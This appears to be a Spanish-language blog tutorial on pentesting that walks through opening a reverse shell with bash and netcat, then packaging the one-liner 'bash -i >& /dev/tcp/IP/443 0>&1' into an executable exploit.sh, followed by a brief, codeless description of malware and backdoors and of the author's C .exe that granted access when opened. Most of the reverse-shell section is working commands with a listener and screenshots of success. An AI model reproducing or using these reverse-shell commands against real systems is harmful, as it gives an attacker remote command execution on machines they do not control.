---
title: ReverShells & Malware
published: true
---



**Hola** hoy estaremos hablando de pentesting web, hablaremos sobre:
* **Creacion de ReverseShell comandos.**
* **Como estan compuestos los payloads exploits malware para windows.**
<br>

Vale primero que es una **ReverseShell**, lo explicara en un lenguaje brusco, una ReverShell es aquella que te permite
ejecutar comandos en una pc que no es tu dominio, es decir una ip el cual es la de la victima conectada a un hosts,
donde el hosts es tu equipo y te permite ejecucion remota de comandos.

[Puedes encontrar mas informacion aqui](https://www.google.com/search?q=ReverseShell&client=firefox-b-d&sxsrf=ALiCzsbKFcBidTADzj_JE7x-ksfIvwVUpA%3A1658946186694&ei=ioLhYpz9KeezqtsPnd-L8A0&ved=0ahUKEwic6qKR2Jn5AhXnmWoFHZ3vAt4Q4dUDCA0&uact=5&oq=ReverseShell&gs_lcp=Cgdnd3Mtd2l6EAMyBwgjELECECcyBwgjELECECcyBwgjELECECcyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEMyBAgAEEM6BwgAEEcQsAM6BAguECc6BAgjECc6CwgAEIAEELEDEIMBOgcIIxDqAhAnOggIABCxAxCDAToFCAAQgAQ6BAgAEAM6BggjECcQEzoKCAAQsQMQgwEQQzoKCC4QsQMQgwEQQzoGCAAQChBDOggIABCABBCxAzoICC4QgAQQsQM6BwgAEIAEEAo6BwgAEAoQywE6BQgAEMsBSgQIQRgASgQIRhgAUM4EWPkxYJkzaAhwAXgBgAHzAYgBrBqSAQYwLjE0LjSYAQCgAQGwAQrIAQjAAQE&sclient=gws-wiz).
<br>


<br>

<center><font color="yellow">[<font color="red">*</font>]</font><font color="green"> Empezaremos con las pruebas de ReverseShell</font></center>
<br>
<font color="white">--> los programas a utilizar para la ReverseShell es bash, netcat, si usas linux es probable que ya los tengas instalados, 
en el caso contrario ejecuta:</font>
<br>

--> Para <font color="yellow"> Linux </font>:

```bash
sudo apt-get install netcat bash -y
```

--> Para <font color="yellow">arch-linux</font>:

```bash
pacman -Sy netcat bash
```

<br>

<p><font color="yellow">[<font color="red">*</font>]</font><font color="red"> Importante </font></p>
<ph>Para estas bruebas si lo vas a hacer desde terminal, tienes que utilizar bash y no zsh por que te dara
errores, claro si quieres puedes probar de zsh y conocer los errores pero si quieres omitir esto, entonces solo ejecutas
el siguiente comando:</ph>

```bash
bash
```


<img src="screenshots/screen_bash.jpg">

<p><font color="yellow">[↑]</font> Como puede ver ya no estoy en la zsh entonces vamos a operar desde la terminal y luego operaremos de un script mailicioso.</p>
<br>

---
<br>
<p><font color="yellow">[*]</font> Empezamos poniendonos en escucha por el puerto 443 de netcat : </p>

```bash
nc -nvlp 443
```

<p><font color="yellow">[*]</font> Miramos que ip tenemos con el comando ifconfig :</p>
```bash
ifconfig
```
<img src="screenshots/ifconfig.jpg">

<p><font color="yellow">[↑]</font> Como pueden ver tengo la ip 127.0.0.1</p>
<br>
<p><font color="yellow">[*]</font> Ahora estando en escucha con netcat "nc -nlvp 443" en el puerto 443, vamos a entablarnos la coneccion desde otra
terminal por que la primera esta siendo ocupada por netcat entonces recuerden ejecutar el comando <b>bash</b> antes de entablar
la coneccion.</p>

<br>

<p><font color="yellow">[*]</font> Para entablar la coneccion hacemos el siguiente comando :</p>

```bash
bash
```
```bash
bash -i >& /dev/tcp/TU-IP/443/ 0>&1
```
<br>
<img src='screenshots/reverse.jpg'>

<p><font color="yellow">[↑]</font> Como pueden ver se me abrio un <b>ReverseShell</b> en la parte donde estaba en escucha con netcat.</p>

-------
<br>

<p><font color="yellow">[*]</font> Ahora pasaremos a desarrollar un <b>script malicioso en bash</b>, para ello aremos los mismo solo que esta ves el comando : 
`bash -i >& /dev/tcp/127.0.0.1/443 0>&1` ira dentro de un script sh para ello:</p>

<br>

```bash
touch exploit.sh && echo -e "bash -i &>/dev/tcp/$(cat /etc/hosts  | grep localhost | awk "NR==1" | cut -d " " -f "1-1")/443 0>&1" >> exploit.sh && chmod +x ./exploit.sh
```

<br>

<p><font color="yellow">[*]</font> Lo que desarrolle con ese comando fue hacer un script en bash para poder entablarme una coneccion pueden hacer <b>ls</b> y veran un
archivo llamado <b>exploit.sh</b> y de paso otorgarle permiso de ejecucion.</p>

No se ofusque si no entiende la anterior  linea de codigo simplemente lo que hace es hacer un archivo con `touch` darle permisos
con de ejecucion `chmod +x exploit.sh` y meterle adentro con `>>` el codigo :

```bash
   bash -i >& /dev/tcp/127.0.0.1 0>&1
```

<br>
<ph><font color="yellow">[*]</font> Pueden hacerlo manualmente con los siquientes comandos :</ph>

```bash
touch exploit.sh
```
```bash
chmod +x exploit.sh
```
<br>

Abren el archivo creado y coloca la siguiente linea : `bash -i >& /dev/tcp/SU-IP/443 0>&1`
<br>
<ph><font color="yellow">[*]</font> Una vez ya echo el archivo, pongace en escucha por el puerto <b>443</b> con netcat. Recuerde
que con el comando <q><b>nc -nlvp 443</b></q> nos poniamos en escucha por el puerto <b>433</b> este puerto puede ser modificado siempre
y cuando el puerto no este en uso, y claramente en el exploit o codigo ponga su respectivo puerto.ﾠ</ph>

ﾠ
<ph><font color="yellow">[*]</font> Nos ponemos en escucha con netcat</ph>
```#!/bin/bash
nc -nlvp 443
```
<br>
<p><font color="yellow">[*]</font> Y ejecutamos el archivo creado</p>
```#!/bin/bash
./exploit.sh
```

<img src="screenshots/final.jpg">

<p><font color="yellow">[↑]</font><b> Ahora como puden ver tengo una reverse shell</b></p>
<br>
<p><font color="yellow">[*]</font> Lo mas comodo de hacerlo por script es que se puden ejecutar el archivo teniendo la zsh y ahorrandose el comando `bash` y
ejecutar el archivo este se debe a la extension <b>"sh"</b> que tiene el archivo.</p>
<br>
<p>Vale ya sabes al menos cosas basicas de como entablarte un reverse shell luego voy a hacer que entiendas como
ganar acceso a un sistema.<b>http,https.</b></p>

---

<br>
<center><font color="green">¿Como estan desarollados los backdoor, exploits, payloads y malware?</font></center>
<br>
<p>Te lo voy a explicar en un lenguaje brusco es decir a mi manera para que puedas entenderlo mas facil.
Un archivo malicioso ya puede ser <font color="red">malware exploit backdoor-(Puerta tracera) payloads</font>, no son mas que archivos en
binario que si recuerdas es lenguaje de la computadora que usa para poder operar. estos archivos puden ser
tambien escritos en hexadecimal para poder luego con un compilador pasarlo a binario.
para esto existen compiladores que te ayudan a crear este tipo de archivo el ultimo
exe que hice fue un archivo escrito en <font color="yellow">C</font> ganabas acceso al sistema con solo abrirlo, pero este no es el caso de hablar de esto.
si quieres aprender a desarrollar un .exe debes aprender lenguaje <font color="yellow">C</font> y con ayuda de una herramienta poder compilarlos
yo utilizaba code block, asi y poder luego crearte archivos .exe a tu favor.</p>
<br>
